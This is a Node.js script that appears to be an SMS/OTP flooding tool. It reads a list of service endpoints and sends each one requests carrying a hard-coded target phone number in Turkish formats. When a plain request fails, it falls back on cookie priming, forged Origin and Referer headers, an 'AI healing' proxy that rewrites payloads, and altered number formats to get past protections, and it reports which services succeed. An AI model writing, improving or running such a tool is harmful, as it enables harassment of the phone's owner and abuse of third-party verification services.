import axios from 'axios';
import { wrapper } from 'axios-cookiejar-support';
import { CookieJar } from 'tough-cookie';
import fs from 'fs';

const TARGET_PHONE = '5343622375';
const TEST_EMAIL = 'test-opencode-all-' + Date.now() + '@test.com';
const PROXY_URL = 'http://localhost:3001/api/proxy';

const STD_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  'Content-Type': 'application/json',
  'Accept': 'application/json, text/plain, */*'
};

// Parse constants.ts to extract all endpoints
function parseConstants(content) {
  const endpoints = [];
  const blocks = content.split('{');
  let current = {};
  for (const block of blocks) {
    const idMatch = block.match(/id:\s+'(\w+)'/);
    const nameMatch = block.match(/name:\s+'([^']+)'/);
    const urlMatch = block.match(/url:\s+'([^']+)'/);
    const methodMatch = block.match(/method:\s+'(\w+)'/);
    const payloadMatch = block.match(/payloadInfo:\s+'([^']+)'/);
    const statusMatch = block.match(/status:\s+'(\w+)'/);

    if (idMatch) current.id = idMatch[1];
    if (nameMatch) current.name = nameMatch[1];
    if (urlMatch) current.url = urlMatch[1];
    if (methodMatch) current.method = methodMatch[1];
    if (payloadMatch) current.payloadInfo = payloadMatch[1].replace(/\\'/g, "'");
    if (statusMatch) {
      current.status = statusMatch[1];
      if (current.id && current.url) {
        endpoints.push({ ...current });
      }
      current = {};
    }
  }
  return endpoints;
}

function parsePayload(payloadInfo, phone, email) {
  if (!payloadInfo) return { phone };
  try {
    let str = payloadInfo;
    str = str.replace(/{{PHONE}}/g, phone);
    str = str.replace(/{{EMAIL}}/g, email);
    str = str.replace(/\+905XXXXXXXXX/g, `+90${phone}`);
    str = str.replace(/905XXXXXXXXX/g, `90${phone}`);
    str = str.replace(/05XXXXXXXXX/g, `0${phone}`);
    str = str.replace(/5XXXXXXXXX/g, phone);
    return JSON.parse(str);
  } catch {
    return { phone };
  }
}

async function directCall(url, method, payload, headers, timeout = 12000) {
  try {
    const response = await axios({
      method: method || 'POST',
      url,
      data: payload,
      timeout,
      headers: headers || STD_HEADERS,
      validateStatus: () => true
    });
    return {
      ok: response.status >= 200 && response.status < 300,
      status: response.status,
      data: response.data
    };
  } catch (err) {
    return {
      ok: false,
      status: err.response?.status || 0,
      data: err.message
    };
  }
}

async function testSingleEndpoint(ep, payload) {
  const strategies = [];

  // 1 — Direct
  strategies.push({ name: 'direct' });
  let r = await directCall(ep.url, ep.method, payload, STD_HEADERS);
  if (r.ok) return { ok: true, strategy: 'direct', status: r.status };

  // 2 — Proxy with AI healing
  strategies.push({ name: 'proxy+ai_heal' });
  try {
    const res = await axios.post(PROXY_URL, {
      serviceId: ep.id, serviceUrl: ep.url, serviceMethod: ep.method,
      targetPhone: TARGET_PHONE, email: TEST_EMAIL,
      initialPayload: payload, allowAiHealing: true
    }, { timeout: 25000, validateStatus: () => true });
    if (res.data.ok) return { ok: true, strategy: 'proxy+ai_heal', status: res.data.upstreamStatus, healed: res.data.healed };
  } catch {}

  // 3 — Cookie-first
  strategies.push({ name: 'cookie_first' });
  try {
    const jar = new CookieJar();
    const client = wrapper(axios.create({ jar, timeout: 8000 }));
    const baseUrl = new URL(ep.url).origin;
    await client.get(baseUrl, { headers: STD_HEADERS, validateStatus: () => true, timeout: 6000 });
    const cookieRes = await client.post(ep.url, payload, {
      headers: STD_HEADERS, timeout: 12000, validateStatus: () => true
    });
    if (cookieRes.status >= 200 && cookieRes.status < 300) {
      return { ok: true, strategy: 'cookie_first', status: cookieRes.status };
    }
  } catch {}

  // 4 — form-urlencoded + extra headers
  strategies.push({ name: 'urlencoded+headers' });
  {
    const origin = new URL(ep.url).origin;
    const forged = {
      ...STD_HEADERS, 'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': origin, 'Referer': origin + '/', 'X-Requested-With': 'XMLHttpRequest',
      'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8'
    };
    let encoded;
    try {
      const parsed = typeof payload === 'object' ? payload : JSON.parse(payload);
      encoded = new URLSearchParams(parsed).toString();
    } catch {
      encoded = typeof payload === 'string' ? payload : JSON.stringify(payload);
    }
    r = await directCall(ep.url, ep.method, encoded, forged);
    if (r.ok) return { ok: true, strategy: 'urlencoded+headers', status: r.status };
  }

  // 5 — Bare phone
  strategies.push({ name: 'bare_phone' });
  r = await directCall(ep.url, ep.method, { phone: TARGET_PHONE }, STD_HEADERS);
  if (r.ok) return { ok: true, strategy: 'bare_phone', status: r.status };

  // 6 — 90 format
  strategies.push({ name: '90_format' });
  r = await directCall(ep.url, ep.method, { phone: `90${TARGET_PHONE}` }, STD_HEADERS);
  if (r.ok) return { ok: true, strategy: '90_format', status: r.status };

  return { ok: false, tried: strategies.map(s => s.name) };
}

async function main() {
  const source = fs.readFileSync('constants.ts', 'utf8');
  const allEndpoints = parseConstants(source);

  console.log(`\n${'='.repeat(80)}`);
  console.log(`  TESTING ALL ${allEndpoints.length} ENDPOINTS — 5+ STRATEGIES EACH`);
  console.log(`  Target: 0${TARGET_PHONE}  |  Email: ${TEST_EMAIL}`);
  console.log(`${'='.repeat(80)}\n`);

  const results = [];

  for (let i = 0; i < allEndpoints.length; i++) {
    const ep = allEndpoints[i];
    const payload = parsePayload(ep.payloadInfo, TARGET_PHONE, TEST_EMAIL);
    const method = ep.method || 'POST';

    process.stdout.write(`[${String(i+1).padStart(3)}/${allEndpoints.length}] ${ep.id.padEnd(22)} `);

    const start = Date.now();
    const result = await testSingleEndpoint(ep, payload);
    const elapsed = ((Date.now() - start) / 1000).toFixed(1);

    if (result.ok) {
      const healNote = result.healed ? '⚡' : '';
      console.log(`✅ ${result.strategy.padEnd(20)} ${result.status} (${elapsed}s)${healNote}`);
    } else {
      console.log(`❌ (${elapsed}s)`);
    }

    results.push({
      id: ep.id, name: ep.name, url: ep.url, method,
      status: ep.status, ok: result.ok,
      strategy: result.ok ? result.strategy : null,
      upstreamStatus: result.ok ? result.status : null,
      tried: !result.ok ? result.tried : null,
      elapsed
    });

    // Rate-limit protection pause
    await new Promise(r => setTimeout(r, 500));
  }

  // Summary
  const working = results.filter(r => r.ok);
  const failed = results.filter(r => !r.ok);
  const improved = results.filter(r => r.ok && r.status === 'not_found' || (r.ok && !r.status));

  console.log(`\n${'='.repeat(80)}`);
  console.log(`  FINAL RESULTS`);
  console.log(`${'='.repeat(80)}`);
  console.log(`  ✅ Total Working: ${working.length}/${allEndpoints.length}`);
  console.log(`  ❌ Failed:        ${failed.length}/${allEndpoints.length}`);
  console.log(`\n  WORKING ENDPOINTS:`);
  for (const r of working) {
    console.log(`    ✅ ${r.id.padEnd(22)} ${r.strategy.padEnd(20)} ${r.upstreamStatus}`);
  }
  if (failed.length) {
    console.log(`\n  FAILED ENDPOINTS:`);
    for (const r of failed) {
      console.log(`    ❌ ${r.id.padEnd(22)} ${r.url.substring(0, 60)}`);
    }
  }

  fs.writeFileSync('test-results-all.json', JSON.stringify(results, null, 2));
  console.log(`\n  📄 Full results saved to test-results-all.json`);
  console.log();
}

main().catch(console.error);
